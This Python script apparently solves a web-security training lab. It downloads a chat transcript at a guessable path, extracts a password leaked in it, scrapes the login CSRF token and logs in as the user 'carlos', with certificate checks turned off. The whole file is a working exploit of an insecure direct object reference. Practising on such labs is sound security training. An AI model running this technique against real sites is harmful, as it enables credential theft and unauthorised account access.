import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_pass(session,url):

    url_pass=url+"/download-transcript/1.txt"
    response=session.get(url_pass,verify=False)
    response=response.text
    if "CONNECTED:" in response:
        password=re.findall(r"password is (.*)\.",response)
        return password[0]
def login_carlos(session,url,password):
    
    url_login=url+"/login"
        # get csrf token ##############################
    response_csrf=session.get(url_login,verify=False)
    response_csrf=response_csrf.text
    soup= BeautifulSoup(response_csrf,"html.parser")
    csrf=soup.find("input",{"name":"csrf"})["value"]
        # done ########################################
        #login to carlos
    data={"csrf":csrf,"username":"carlos","password":password}
    respone=session.post(url_login,data=data,verify=False)
    respone=respone.text
    if "Congratulations, you solved the lab!" in respone:
        print("(+) lab solved successfully ! ")
    else:
        print('(-) Eroor !')
    

def main():
    if len(sys.argv) != 2:
        print("(+) Usag]e %s <url>"%sys.argv[0])
        print('(+) Example : %s www.site.com'%sys.argv[0])
        sys.exit(-1)

    url=sys.argv[1]
    session=requests.session()
    password=get_pass(session,url)
    login_carlos(session,url,password)

if __name__ == "__main__":
    main()